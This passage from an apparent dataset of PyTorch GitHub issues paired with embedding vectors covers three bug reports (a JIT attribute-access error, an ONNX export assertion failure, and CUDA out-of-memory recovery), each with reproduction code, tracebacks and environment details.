  1.22846678e-01 -1.84127778e-01 -2.58000374e-01 -3.22399944e-01
 -3.58070210e-02 -1.21703483e-02  7.22700804e-02 -3.69226962e-01
 -8.19223672e-02 -2.67195880e-01  1.61866739e-01  3.99165899e-01
  1.27437770e-01  4.26661447e-02 -1.63007230e-01  1.29464090e-01
 -3.34852278e-01 -1.69630557e-01 -1.11645013e-01 -1.86095104e-01
 -5.55580109e-02 -2.89022207e-01 -1.12486951e-01 -2.52694488e-01
 -2.13684797e-01  2.07610130e-01 -1.91688001e-01 -4.69029769e-02
  2.76913047e-01 -5.69420978e-02  2.13570688e-02  1.63069725e-01
 -1.03827775e-01 -5.80173284e-02 -1.12120882e-01  2.30792597e-01
 -2.24594716e-02 -9.40272659e-02  1.83059135e-03 -1.99262835e-02
  1.75439388e-01 -3.56515497e-02 -1.78282596e-02 -1.87094823e-01
 -5.67064732e-02 -2.40911171e-03  6.88401759e-02  1.06359646e-02
  1.23213366e-01  1.85274463e-02  2.58094877e-01 -2.45565027e-01
 -1.59746185e-01 -1.16768777e-01 -3.08550179e-01  3.64435054e-02
  1.75905079e-01  2.55327940e-01 -3.97000968e-01  2.43572801e-01
  5.97696543e-01 -3.29026803e-02 -6.14014156e-02  2.00599313e-01
  9.19882022e-03 -9.99819040e-02  1.80408359e-03 -3.50474000e-01
 -7.41366148e-02  2.37090103e-02  5.02134413e-02 -1.92458332e-01
  3.17575097e-01 -8.72017592e-02  4.12506387e-02  3.33201662e-02
  6.55347407e-02 -1.12530448e-01  7.99167976e-02 -1.14484668e-01
 -9.04096439e-02 -2.39209309e-01 -3.74712735e-01  2.14940794e-02
 -2.85971183e-02 -3.15884016e-02 -2.19341964e-01  3.10666621e-01
  1.99759096e-01  6.63414821e-02 -1.52859658e-01  9.23134014e-02
  4.30592448e-02 -1.73603117e-01  2.04737976e-01  1.25666216e-01
 -1.33062694e-02 -4.08270955e-02 -6.78988844e-02 -6.14500530e-02
 -3.07429601e-02 -5.89620247e-02  7.72966221e-02 -2.27785166e-02
  3.38724494e-01 -5.06500125e-01  5.82956113e-02  3.89154673e-01
  8.63290429e-02  4.92001176e-01 -8.73345062e-02  1.66997343e-01
 -1.13574192e-01  2.43336409e-01 -1.06800944e-01  1.90310195e-01
 -2.02731341e-01 -7.17350394e-02 -2.39688993e-01  2.51374766e-02
  1.37478530e-01  2.30062142e-01 -8.09693858e-02 -1.04093209e-01
 -1.81167185e-01 -3.78950387e-02 -2.10575581e-01 -3.15465212e-01
 -1.08715460e-01 -1.41576320e-01 -1.65597070e-02  3.24815772e-02
  1.30588889e-01  3.59019861e-02 -7.72219002e-02 -2.01537609e-01
 -1.26652434e-01 -1.03748903e-01  2.28665546e-01 -8.56279731e-02
 -1.04151435e-01  1.21379681e-02  1.75431460e-01  3.84745806e-01
  4.91553210e-02 -1.19597595e-02 -1.84968293e-01  3.69638860e-01
  1.75265431e-01 -1.87431395e-01 -2.46165097e-01  2.68143117e-01
 -2.59178400e-01  1.87645584e-01  2.56188631e-01  2.21242741e-01
 -2.37809539e-01 -2.33779311e-01 -1.17843814e-01  2.05566622e-02
  4.19447213e-01 -3.42288986e-04 -1.00886419e-01 -9.01664272e-02
  2.60715723e-01  1.89761937e-01 -2.79393673e-01  1.57115012e-01
  9.74786654e-02  1.25545144e-01  1.93540469e-01 -8.20781142e-02
  1.90482587e-01 -3.02018225e-01  4.75535467e-02 -5.18604852e-02
 -3.56362998e-01  5.93740381e-02  1.83209069e-02 -6.59858808e-02]"
[JIT] Cannot access nn.Linear.in_features in ScriptModule oncall: jit triaged,"## ðŸ› Bug

```python
import torch.nn as nn
import torch.jit as jit

class TestModule(jit.ScriptModule):
  def __init__(self):
    super().__init__()
    self.linear = nn.Linear(16, 16)


m = TestModule()
print(m.linear.in_features)
```

The code above throws AttributeError

```python
>>> m.linear.in_features
Traceback (most recent call last):
  File ""/home/qbx2/anaconda3/lib/python3.7/site-packages/torch/jit/__init__.py"", line 1197, in __getattr__
    return ScriptModule.__getattr__(self, attr)
  File ""/home/qbx2/anaconda3/lib/python3.7/site-packages/torch/jit/__init__.py"", line 1102, in __getattr__
    return Module.__getattr__(self, attr)
  File ""/home/qbx2/anaconda3/lib/python3.7/site-packages/torch/nn/modules/module.py"", line 535, in __getattr__
    type(self).__name__, name))
AttributeError: 'WeakScriptModuleProxy' object has no attribute 'in_features'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
  File ""/home/qbx2/anaconda3/lib/python3.7/site-packages/torch/jit/__init__.py"", line 1200, in __getattr__
    return getattr(self.__dict__[""_original""](), attr)
AttributeError: 'NoneType' object has no attribute 'in_features'
```

## Expected behavior

Looking at the code (https://github.com/pytorch/pytorch/blob/master/torch/jit/__init__.py#L1226), I think WeakScriptModuleProxy should have copied in_features and other fields to self here.

## Environment

Collecting environment information...
PyTorch version: 1.0.1.post2
Is debug build: No
CUDA used to build PyTorch: 10.0.130

OS: Ubuntu 18.04.1 LTS
GCC version: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0
CMake version: Could not collect

Python version: 3.7
Is CUDA available: Yes
CUDA runtime version: 10.0.130
GPU models and configuration: GPU 0: GeForce RTX 2080
Nvidia driver version: 410.48
cuDNN version: /usr/local/cuda-10.0/lib64/libcudnn.so.7.4.1

Versions of relevant libraries:
[pip] numpy==1.15.4
[pip] numpydoc==0.8.0
[pip] torch==1.0.1.post2
[conda] blas 1.0 mkl
[conda] mkl 2019.1 144
[conda] mkl-service 1.1.2 py37he904b0f_5
[conda] mkl_fft 1.0.6 py37hd81dba3_0
[conda] mkl_random 1.0.2 py37hd81dba3_0
[conda] pytorch 1.0.1 py3.7_cuda10.0.130_cudnn7.4.2_2 pytorch

https://discuss.pytorch.org/t/cannot-access-nn-linear-in-features-in-scriptmodule/42833",True,"[-0.4856142  -0.08591816 -0.19098869  0.07637691  0.11189058 -0.053377
  0.36612326  0.37755218 -0.48369443 -0.04689688  0.03198146 -0.12206647
 -0.05563451  0.23443916  0.04761707 -0.00976046 -0.19927861 -0.26049888
 -0.08089041 -0.16424903  0.5416448  -0.2720672  -0.02581063  0.09297629
 -0.18661194  0.1572868  -0.08922959 -0.06342708  0.4123677  -0.12194186
  0.09354448  0.33980346 -0.5242996   0.10366981  0.23479399  0.23675883
 -0.14628354 -0.05322374 -0.15400666 -0.17030871  0.21542497  0.32380962
  0.06687054 -0.22550035  0.36830252 -0.10558766 -0.11639126  0.07775963
 -0.13711914 -0.2910447   0.04282274  0.3116762  -0.09698662 -0.17159197
  0.2223101  -0.19830039 -0.14130457 -0.12456134  0.316186   -0.39240983
 -0.00516698  0.04788106 -0.23858619  0.18327713  0.14609715 -0.06514147
 -0.1504873   0.12099884  0.25338525 -0.00329251 -0.05976861  0.08239824
 -0.04089374  0.11142588  0.15645319 -0.0089262  -0.43187705 -0.05889278
 -0.40392983 -0.11651134  0.28914496  0.0671684   0.15157522 -0.18010366
  0.03123043  0.3219225   0.12746555 -0.1232081   0.09963651  0.20320514
  0.15699434 -0.16198432 -0.22465289  0.38057202 -0.08426457 -0.08338504
  0.27335674 -0.13823792 -0.34879822 -0.27808896 -0.20538715 -0.5460201
 -0.0009117   0.24113147 -0.03190009  0.16903856  0.05254183  0.03696467
  0.36029965 -0.23478356 -0.00892902  0.1410385  -0.04316942 -0.15818228
  0.22474036 -0.12140831 -0.31588364 -0.06606209 -0.11091539  0.4668982
  0.21746524  0.23170173 -0.09426172  0.3980105   0.44054574  0.25581324
  0.15778522 -0.11314178  0.11987004  0.04498529 -0.04568979  0.19221368
 -0.19915554  0.02456302  0.37969574 -0.05378469 -0.46244606  0.23629504
  0.02791309 -0.07297768 -0.38839006  0.05965404 -0.05995732 -0.17009251
  0.26631117 -0.47807825 -0.234417    0.24724436 -0.01629749 -0.24981299
 -0.1086174   0.12693456 -0.3355905   0.17575316 -0.06648174  0.4283801
  0.13374579  0.01801894  0.21968338 -0.23937558  0.2051059   0.40451556
  0.19263458 -0.08894336  0.30867428 -0.11553888  0.05479205  0.09966439
 -0.6410438  -0.03075287 -0.08237974 -0.16996783 -0.26950416 -0.0728462
  0.1246785   0.07166649 -0.24965563 -0.2219297  -0.28092885  0.59221053
  0.38288808  0.25975394  0.07456868  0.08425821 -0.16637856 -0.04272447
  0.3259495   0.11288921 -0.12181911  0.07020555 -0.3850984  -0.0643272
  0.38381237 -0.06046066  0.07846974 -0.0959403   0.20748153 -0.10727312
 -0.3252474   0.01398436 -0.3821262  -0.01727053  0.22125487 -0.1800318
  0.09894991  0.21778679 -0.2512821  -0.0916675  -0.11331528  0.08722719
 -0.21193674 -0.01257191 -0.05577821 -0.28614402  0.03023629 -0.17216308
  0.3677413  -0.11560433  0.03716598  0.05780011  0.40506834 -0.22367173
  0.05688024 -0.10110767  0.26507956  0.5045694  -0.11355025  0.24461879
 -0.04767451 -0.09424766  0.05221371 -0.1312622   0.6034614  -0.05088861
  0.1543357   0.42299592  0.1093406  -0.00166412  0.10324822  0.06146113
 -0.4497924   0.08732595  0.16081023 -0.18124138 -0.08714046 -0.15328357
 -0.36990994 -0.42270765  0.04791075  0.09915236 -0.5641261  -0.0843
 -0.16499652  0.00493319  0.22794321  0.48352718 -0.04429855 -0.13819492
 -0.12409429 -0.01563766  0.09262145  0.31506726 -0.10711527  0.01331153
 -0.01080208 -0.11464566 -0.1795674  -0.11677079  0.17473714 -0.06040845
 -0.00810944 -0.41072804  0.38947597  0.39096704  0.12138025  0.10510124
  0.29340625 -0.17849956 -0.16070285 -0.32914826  0.21600035  0.20799053
 -0.10745259  0.09745651  0.34136483 -0.29295868 -0.04077143 -0.06214954
 -0.2980531  -0.41587284 -0.11272648 -0.17883345  0.70210874 -0.033023
 -0.36152673  0.04374056  0.15062077 -0.10453817 -0.03872847 -0.05050588
 -0.04485246  0.31616694  0.3387456   0.18413356  0.19463323  0.11153105
  0.2097782  -0.21812138  0.34787565 -0.17469703  0.36731517  0.1123569
 -0.10937685 -0.16165952 -0.28898484  0.09438239  0.03571203  0.15965877
  0.23469746  0.13970575 -0.17046092 -0.32464194 -0.53411615  0.06318149
 -0.11410616  0.03259054 -0.27679554 -0.08121689 -0.03825038 -0.11870903
  0.15851352  0.18201552 -0.18939885  0.08676088 -0.13322389 -0.06600142
 -0.20886564  0.42169937 -0.03663617 -0.0044043  -0.11928941 -0.14230597
 -0.12980819 -0.21708378 -0.20890018 -0.32615328  0.05688888  0.04294471
 -0.25314924  0.49638984  0.08164759 -0.08005105 -0.23787309  0.29716817
  0.20446602  0.37038934 -0.11314205  0.18434833  0.01926932  0.28949904
  0.0886966   0.21082903 -0.26229054 -0.26855195 -0.1262813  -0.05670144
  0.28003305 -0.3565446  -0.0097043  -0.11563452 -0.20155096  0.07618429
 -0.24311411  0.054608    0.27418196 -0.04844199  0.01935965 -0.04098774
  0.11256495 -0.18491276 -0.36412707  0.28411168  0.12780319 -0.05347472]"
[onnx] crash when exporting a model with Sequence module (encodeBlock: Assertion failled ) high priority module: onnx triaged module: assert failure,"## ðŸ› Bug

The tracer in onnx exporter is failing with an assertion error in the exporter.

## To Reproduce

Steps to reproduce the behavior:

1. define a model:

```
class SomeModel(nn.Module):

    def __init__(self):
        super(SomeModel, self).__init__()
        dim = 5
        self.emb = nn.Embedding(10, dim)
        self.lin1 = nn.Linear(dim, 1)
        self.seq = nn.Sequential(
            self.emb,
            self.lin1,
        )

    def forward(self, input):
        return self.seq(input)

model = SomeModel()
```

2. run export:

```
dummy_input = torch.tensor([2], dtype=torch.long)
dummy_input

torch.onnx.export(model, dummy_input, ""model.onnx"", verbose=True)
```

fails with:

```
[redacted]/vendor/local/lib/python2.7/site-packages/torch/onnx/utils.pyc in _export(model, args, f, export_params, verbose, training, input_names, output_names, operator_export_type, export_type, example_outputs, propagate)
    230     defer_weight_export = export_type is not ExportTypes.PROTOBUF_FILE
    231     if export_params:
--> 232         proto, export_map = graph.export(params, _onnx_opset_version, defer_weight_export, operator_export_type)
    233     else:
    234         proto, export_map = graph.export([], _onnx_opset_version, False, operator_export_type)

RuntimeError: torch/csrc/jit/export.cpp:296: encodeBlock: Assertion `b->inputs().size() >= num_initializers` failed.
```

## Expected behavior

Model is exported to ONNX

## Environment

```
Collecting environment information...
PyTorch version: 0.4.1
Is debug build: No
CUDA used to build PyTorch: 9.0.176

OS: Ubuntu 16.04.6 LTS
GCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
CMake version: Could not collect

Python version: 2.7
Is CUDA available: No
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA

Versions of relevant libraries:
[pip] msgpack-numpy==0.4.3.1
[pip] numpy==1.14.1
[pip] torch==0.4.1
[conda] Could not collect
```

## Additional context

As a workaround one can inline layer definitions into the sequence:

```
class SomeModel(nn.Module):

    def __init__(self):
        super(SomeModel, self).__init__()
        dim = 5
        self.seq = nn.Sequential(
            nn.Embedding(10, dim),
            nn.Linear(dim, 1),
        )

    def forward(self, input):
        return self.seq(input)

model = SomeModel()
```
",True,"[-2.78948903e-01 -1.39382035e-01 -1.97529197e-01 -3.17699552e-01
  9.98097062e-02 -1.95264757e-01  1.53980583e-01  8.28977525e-02
 -4.97817069e-01 -1.27918035e-01  2.51481086e-01 -1.26189329e-02
  2.43085980e-01  1.99461475e-01 -1.79619104e-01  1.95124894e-01
 -3.79484259e-02 -1.49000779e-01 -6.07714579e-02  1.80782974e-01
  1.00892439e-01 -6.71590120e-02 -1.00934179e-04 -4.94535379e-02
  1.13481641e-01  8.11595395e-02 -1.70661241e-01 -1.16468541e-01
  3.71210814e-01 -3.88929397e-02  8.92651677e-02  2.10196137e-01
 -2.54857898e-01  1.78048372e-01  5.13512492e-02  2.87877202e-01
 -4.81916815e-01 -2.96195075e-02 -1.23372570e-01 -8.02278072e-02
  1.39901370e-01  1.48489233e-02  6.67160004e-02 -1.06364086e-01
 -9.00721550e-02 -3.64939094e-01 -2.09233642e-01  9.62085575e-02
 -1.11942589e-01  1.27758950e-01 -2.12994725e-01  3.33052538e-02
 -2.17700869e-01 -3.82087827e-01  8.82973298e-02 -1.28055662e-01
  4.25246097e-02  6.15773387e-02 -8.73569921e-02 -1.36456981e-01
  1.03091151e-01 -7.07467049e-02 -1.22185513e-01 -3.76864001e-02
  2.84016848e-01  9.87801179e-02 -1.22804560e-01  1.84253171e-01
  3.36127937e-01  1.39903843e-01  1.92200407e-01 -2.49455916e-03
 -2.31483981e-01  2.19872594e-02  1.43471718e-01 -1.58532217e-01
 -2.22250313e-01  8.42145979e-02 -1.02075055e-01  6.10186812e-03
 -1.21873982e-01 -2.45497432e-02 -1.89180121e-01 -1.09848276e-01
  9.66573507e-03 -1.08640948e-02  1.16972081e-01 -2.04971090e-01
  4.51376855e-01  2.63152480e-01  4.18026090e-01  1.86311863e-02
  6.69589639e-02  3.94041568e-01  1.18247055e-01  4.26118881e-01
  6.20750971e-02  1.83616266e-01 -1.10284939e-01 -1.00103706e-01
  7.81818293e-03 -4.58813637e-01 -2.69983828e-01  2.73448884e-01
  5.19093648e-02 -1.60690874e-01  2.95982659e-02 -7.55888671e-02
  3.39462161e-02 -1.19272634e-01  9.06222835e-02 -1.44926727e-01
 -1.27064764e-01 -6.30108938e-02 -7.40392953e-02  1.03596002e-01
  2.48018801e-01 -1.08171925e-01 -3.32011104e-01  1.26262546e-01
  2.58179903e-01  1.09651126e-01  1.75827146e-01  9.60399732e-02
  2.34963447e-01  2.22577989e-01 -5.82659319e-02 -1.99735254e-01
 -1.02373756e-01 -9.61822197e-02  2.38538131e-01  2.33235955e-01
 -2.04412162e-01 -1.71339080e-01  3.21802020e-01  1.36283293e-01
 -2.70489514e-01 -2.32064515e-01 -2.71692634e-01 -7.84002095e-02
 -4.92255926e-01  8.78394023e-03  2.22092897e-01 -1.41564146e-01
  1.52851373e-01 -6.40857965e-02 -1.40740111e-01  3.47076118e-01
  2.17277288e-01 -1.62193134e-01 -2.94451248e-02 -3.48213971e-01
 -2.18079060e-01  2.72964776e-01  1.97412729e-01  1.38139337e-01
  5.16347826e-01  1.10398367e-01  7.41707236e-02 -4.19478089e-01
 -2.49232024e-01  4.17386234e-01  1.95506394e-01  2.36516371e-02
  8.63385499e-02  2.51836658e-01 -9.35785547e-02  8.71431604e-02
 -3.83122444e-01 -2.62338538e-02 -1.53455749e-01 -1.54063582e-01
  7.40258545e-02 -2.28965878e-01  1.21485084e-01  7.36575276e-02
 -3.65613997e-02 -3.55755478e-01  5.54115996e-02  3.70588601e-01
  4.58640963e-01  1.33693904e-01  6.01625815e-02  1.52085736e-01
  3.43071483e-03  1.96752340e-01  4.52137068e-02 -3.17282341e-02
 -2.04623789e-01 -1.82013735e-02 -2.43493289e-01  1.02247596e-01
  3.73043120e-01  7.85299018e-02 -3.95457558e-02 -3.31947029e-01
  1.46569639e-01 -5.95816560e-02  6.72222078e-02  6.64996542e-03
  6.38056826e-03  6.68093003e-03  2.91871130e-01 -2.48487487e-01
  9.91820320e-02  6.08435720e-02 -2.06128076e-01 -4.36731219e-01
 -1.26755029e-01  2.86077142e-01 -4.72075611e-01 -2.63459742e-01
  6.49317354e-02 -1.03366822e-01 -1.90653905e-01 -8.60810876e-02
 -7.12524652e-02 -6.65895566e-02  1.33819953e-01  5.48239313e-02
 -4.71156314e-02 -4.85914014e-02 -8.00375938e-02 -1.38274610e-01
  8.86256322e-02  2.70027339e-01  2.01949954e-01 -4.84015942e-02
  9.59766358e-02 -2.09517404e-03 -6.87148720e-02  1.46466289e-02
  2.67217696e-01  1.15859210e-01 -8.61845464e-02  3.00282627e-01
  9.03174952e-02 -1.09222531e-01 -3.56416047e-01 -7.72261098e-02
  1.45024229e-02  1.50428906e-01  1.42729543e-02 -3.35040867e-01
  2.93518938e-02 -1.31479651e-01  1.01734400e-01  7.82865807e-02
 -2.41382852e-01  1.43702120e-01 -2.65456557e-01  1.17856801e-01
  3.82913053e-01  2.41841488e-02  2.44302019e-01  3.46893132e-01
  1.04042828e-01 -2.18963638e-01  4.55784984e-02  1.07391417e-01
  1.32854618e-02  2.61373878e-01  5.91327399e-02  1.29365996e-01
 -1.08770430e-01 -1.58448055e-01 -2.89592922e-01  1.37228385e-01
  1.85819771e-02 -2.09108174e-01  2.11984485e-01 -2.04695180e-01
  3.41417700e-01 -1.73493266e-01  2.71854728e-01 -1.25957608e-01
  3.65285456e-01 -2.64731973e-01 -4.69221771e-02 -4.22160812e-02
 -6.51702955e-02  1.32669777e-01  2.41977014e-02  1.09123051e-01
  2.29821116e-01 -1.14178419e-01  1.27834538e-02  4.60793301e-02
 -3.74298573e-01 -2.71087945e-01 -1.67935401e-01  1.43476367e-01
  3.18760797e-02  1.54001471e-02 -4.75701243e-01  1.50156021e-01
  1.06723100e-01 -1.72897875e-02  1.06289513e-01 -1.41946942e-01
 -1.59387887e-01 -9.22459066e-02  1.97664738e-01 -1.89467371e-01
 -2.06243500e-01  4.70734574e-03  2.62656808e-01  2.15623111e-01
  2.26291031e-01 -6.18994296e-01  5.15346885e-01  1.90115929e-01
 -1.99654713e-01  1.03119351e-01 -9.79381055e-02  1.98387802e-01
 -1.89055920e-01  5.87740362e-01 -4.74925637e-02  3.20860893e-02
 -3.79082650e-01 -2.17036977e-01  1.24303371e-01 -1.40692443e-01
  1.09017365e-01  1.55084819e-01 -1.45476788e-01 -1.07054412e-01
  7.38545060e-02  3.44923884e-03  5.67959715e-03  1.45113125e-01
 -1.18427120e-01  2.89641500e-01 -1.55123770e-01 -2.21776918e-01
 -2.21905917e-01  3.98049742e-01  6.86574876e-02 -1.89399570e-01
  1.86560318e-01 -3.72819960e-01 -2.43376255e-01 -2.38560632e-01
 -1.43605664e-01 -2.85613775e-01 -1.30617797e-01  3.19216996e-01
  2.22096041e-01  2.28311956e-01  1.65147692e-01 -1.11857466e-01
  1.88049555e-01  2.40263343e-01 -3.77670050e-01  2.91500390e-01
  3.29887897e-01  1.78289246e-02 -2.61155199e-02  4.44086730e-01
 -1.87814042e-01  5.43765500e-02 -3.06236267e-01 -2.54200608e-01
 -2.04761773e-01 -1.03537440e-01  1.01454668e-02 -1.65317938e-01
  1.58658355e-01  8.81404430e-02 -1.06811225e-01  2.45188847e-02
 -2.03675568e-01 -1.50076319e-02  1.33050010e-01 -2.47985646e-02
 -8.96401107e-02 -2.06345692e-02  4.46649343e-01  3.62211615e-02
 -8.32164362e-02  1.30763620e-01  9.79304314e-03  1.17465220e-01]"
Inconsistent recovery from CUDA OOMs high priority oncall: distributed module: autograd module: memory usage triaged has workaround,"## ðŸ› Bug

**Editorial note:** Make sure that you are not holding on to tensors via an exception object (which contains the stack trace and will retain tensors). Do not bring the exception object into scope, or do error recovery outside of the catch block.

Catching a RuntimeError on a CUDA OOM should allow one to gracefully recover, for example by lowering the batchsize. This is particularly important when using DistributedDataParallel, where workers must sync on backward, and so it's important that we be able to perform a ""dummy batch"" after an OOM in order to stay in sync with other workers.

Observed behavior during a CUDA out of memory event is inconsistent across nondistributed/dataparallel/distributeddataparallel. Expected behavior is that all modes should be able to recover easily.


## To Reproduce
Test case and logs available here:
https://gist.github.com/stephenroller/bd2cd644e7c117c1ec8192639ecf30b6


Steps to reproduce the behavior:

1. Download [`memtestcase.py`](https://gist.githubusercontent.com/stephenroller/bd2cd644e7c117c1ec8192639ecf30b6/raw/886b74c3529dbdb3af6f072ebc623abe1c852a6b/memtestcase.py) and [`run.sh`](https://gist.githubusercontent.com/stephenroller/bd2cd644e7c117c1ec8192639ecf30b6/raw/886b74c3529dbdb3af6f072ebc623abe1c852a6b/run.sh)
2. Run `run.sh`. Observe which test cases pass.

Logs from several environments on the fair cluster:
1. pytorch 1.0.0 (@klshuster's env) (pytorch 1.0.0, cuda 9.0.176): https://gist.github.com/stephenroller/bd2cd644e7c117c1ec8192639ecf30b6#file-kurtlog-pytorch-1-0-0-cuda-9-0-176
2. fairseqenv (@myleott's) (pytorch 1.0.0.dev20190211, cuda 10.0.130): https://gist.github.com/stephenroller/bd2cd644e7c117c1ec8192639ecf30b6#file-fairseqenv-pytorch-1-0-0-dev20190211-cuda-10-0-130
3. pytorch stable env (@stephenroller's): https://gist.github.com/stephenroller/bd2cd644e7c117c1ec8192639ecf30b6#file-stable-env-pytorch-1-0-1-post2-cuda-10-0-130

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior

All test cases pass. At the very least, test cases should produce consistent results across all `--mode`s.

## Environment

Here's the environment from the third log (@stephenroller's) (pytorch 1.0.1.post2, cuda 10.0.130):

```
Collecting environment information...
PyTorch version: 1.0.1.post2
Is debug build: No
CUDA used to build PyTorch: 10.0.130

OS: Ubuntu 18.04.1 LTS
GCC version: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0
CMake version: version 3.10.2

Python version: 3.7
Is CUDA available: Yes
CUDA runtime version: 10.0.130
GPU models and configuration:
GPU 0: Quadro GP100
GPU 1: Quadro GP100

Nvidia driver version: 410.79
cuDNN version: Could not collect

Versions of relevant libraries:
[pip] numpy==1.16.2
[pip] pytorch-pretrained-bert==0.6.1
[pip] torch==1.0.1.post2
[pip] torchtext==0.3.1
[conda] blas                      1.0                         mkl
[conda] mkl                       2019.3                      199
[conda] mkl_fft                   1.0.10           py37ha843d7b_0
[conda] mkl_random                1.0.2            py37hd81dba3_0
[conda] pytorch                   1.0.1           py3.7_cuda10.0.130_cudnn7.4.2_2    pytorch
[conda] pytorch-pretrained-bert   0.6.1                     <pip>
[conda] torchtext                 0.3.1                     <pip>
```


cc @ezyang @gchanan @zou3519 @SsnL @albanD @gqchen @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @aazzolini @xush6528 @osalpekar",True,"[-1.48043156e-01 -3.75578612e-01 -3.18588197e-01 -1.34247243e-01
  1.01722538e-01 -3.24017644e-01 -1.27656370e-01  1.18113250e-01
 -5.08956850e-01 -8.51751715e-02  1.40709549e-01  4.94434424e-02
 -5.71382865e-02  4.21944857e-02 -3.05208147e-01  9.26537439e-02
  7.68314749e-02  8.72153714e-02 -1.33945167e-01  1.19024292e-02
 -7.36348331e-02 -7.22342134e-02 -5.34381084e-02  2.36617960e-03
  1.31925985e-01  1.25015765e-01 -6.64827377e-02 -2.80196071e-01
  3.11399937e-01 -2.38831222e-01  6.81582987e-02  1.49462238e-01
 -1.90839678e-01 -3.49463299e-02 -1.06846482e-01  1.34239793e-01
 -3.16137314e-01 -4.36237156e-01  1.80398077e-01 -1.24162287e-02
 -1.37279063e-01 -5.10061160e-02 -4.91288118e-03  1.73793491e-02
 -1.46743655e-01 -1.88901901e-01  6.12529442e-02  2.86892802e-01
 -1.99806795e-01 -5.46238571e-02  2.26397544e-01  8.76014978e-02
 -2.68236510e-02 -3.61364573e-01 -1.70895472e-01  2.02924788e-01
  2.24681765e-01  1.06998727e-01 -1.01160698e-01  1.09503277e-01
  1.54473513e-01 -1.87418535e-01 -1.40775107e-02 -1.23113364e-01
  2.82992423e-01  4.16722521e-02  2.18129069e-01 -1.64737299e-01
  6.77907944e-01  1.27898276e-01  7.30216280e-02  3.84999961e-01
 -4.95763391e-01 -1.99490055e-01  8.02160949e-02  3.79245430e-01
  8.86524320e-02 -5.69859371e-02  1.74617499e-01 -6.94666132e-02
  1.28282294e-01  5.11596091e-02  1.01303369e-01 -3.95644307e-01
  1.00202434e-01 -3.48230600e-01  1.86473668e-01  2.15484202e-01
  6.38033822e-02 -1.06083594e-01  2.20311284e-01  5.87596372e-02
 -6.24780431e-02  2.67015576e-01  6.95275590e-02  1.98702067e-01
  1.82616562e-02  1.47912070e-01 -2.34822616e-01 -1.18173473e-01
 -6.99157938e-02 -3.48269939e-01 -3.15980136e-01  3.90285045e-01
 -2.37573087e-01 -7.32066110e-03  1.47313913e-02  3.47920991e-02
 -6.77175820e-02 -9.34603140e-02  1.83757961e-01  8.47604722e-02
  2.31317297e-01  7.83004016e-02  1.21821642e-01  1.22906506e-01
 -1.25729680e-01 -4.12536487e-02  1.32331938e-01 -2.50213593e-01
 -2.59342492e-01 -1.03095390e-01  1.63263500e-01 -8.33275393e-02
  1.39554441e-01  2.30814368e-01  2.96701908e-01 -6.19771443e-02
  9.94210988e-02 -3.30825299e-02  2.58611124e-02 -3.25545192e-01
  3.54982913e-02 -2.67034531e-01  8.94238334e-03  1.73106954e-01
 -2.54019439e-01 -2.96592534e-01 -9.51994061e-02 -6.83189332e-02
 -4.13920581e-02 -4.91575040e-02  1.57500327e-01 -1.07297078e-01
  1.81710154e-01  3.82248163e-01  1.29419535e-01  1.50976330e-01
  1.17029913e-01  4.07732762e-02  7.39070773e-02 -2.00554878e-01
 -3.61276031e-01  5.83741181e-02  1.49102911e-01  4.25880671e-01
  1.55935675e-01 -9.14949477e-02 -2.07850449e-02 -4.51441407e-01
 -1.03144974e-01  3.54499280e-01  7.89966881e-02  1.31225228e-01
  5.33088259e-02  2.27846682e-01 -1.26865342e-01 -1.91085815e-01
 -6.56404719e-02  3.33243430e-01 -6.82955235e-02 -7.64039829e-02
  1.09434508e-01 -2.71043748e-01  1.57935828e-01 -2.15717584e-01
 -2.40018189e-01 -3.05495620e-01  2.52945647e-02  2.56394267e-01
 -2.60262471e-03  1.63566396e-02  1.87686294e-01  9.35226753e-02
  4.02296036e-01  3.28595132e-01  3.28318596e-01  8.89682248e-02
 -1.52192444e-01 -1.97422624e-01 -4.88986909e-01  4.28709090e-02
  8.85582194e-02  7.77373314e-02  5.03854975e-02 -2.74345934e-01
 -8.20554495e-02 -9.57383588e-02  7.26514161e-02  1.20800197e-01
 -1.22728407e-01 -4.58431914e-02 -2.96019837e-02  1.90447904e-02
  1.95493504e-01 -1.54617876e-01 -3.18292677e-01 -4.12987530e-01
  1.71400547e-01  1.17125683e-01 -3.91099274e-01 -3.11785936e-01
 -2.87394196e-01 -1.54736757e-01 -3.22474837e-01  4.25600186e-02
  8.81682634e-02  1.01747796e-01  1.17104270e-01 -6.37852997e-02
  3.23016524e-01 -9.81190428e-02  2.97418594e-01 -2.03041077e-01
  5.45965545e-02  2.27016807e-02  1.90778404e-01 -1.85672000e-01
 -1.59599259e-02  1.41093835e-01 -1.41163588e-01  2.34865904e-01
 -4.66993600e-02 -2.16902554e-01 -3.29084396e-01 -3.41207646e-02
  8.45045596e-02 -4.08195741e-02 -2.05481410e-01  8.13322216e-02
 -3.88408780e-01 -1.22597948e-01 -2.94263393e-01  7.94662349e-03
  2.46632606e-01  4.03868943e-01 -1.40999988e-01  8.96282196e-02
 -2.91559517e-01 -3.38086113e-03 -3.29284966e-01  1.23209208e-02
  1.01689808e-01 -2.24518985e-01  1.02400117e-01 -2.70395041e-01
 -4.39005420e-02  3.19706500e-02  1.03612587e-01  7.81784058e-02
  4.37857240e-01  1.14256531e-01 -3.39144528e-01  5.97300053e-01
  1.13465548e-01  2.81347990e-01 -4.03995067e-01  8.74181539e-02
 -1.38324732e-02 -2.60394700e-02 -1.15487948e-01 -8.17272663e-02
  1.30240656e-02  6.36283904e-02 -4.22746390e-02  1.69290155e-02
  6.57629669e-01 -2.10344508e-01  2.04309314e-01  1.21524468e-01
  4.39403474e-01 -1.08561590e-01 -2.06516776e-02  5.92456432e-04
  1.00557797e-01 -2.72615552e-01 -2.02161938e-01 -7.68351555e-02
 -1.63114518e-02 -1.05629653e-01 -3.33647072e-01  2.91949511e-01
  8.56475458e-02  7.03422800e-02 -1.40117466e-01  2.25306153e-01
  5.66376187e-03  9.00692493e-03  2.50289381e-01 -2.24563688e-01
 -4.18377757e-01 -6.65148050e-02 -6.21849038e-02 -6.11645654e-02
 -3.12127858e-01 -3.43014240e-01  2.75728285e-01  1.37374997e-01
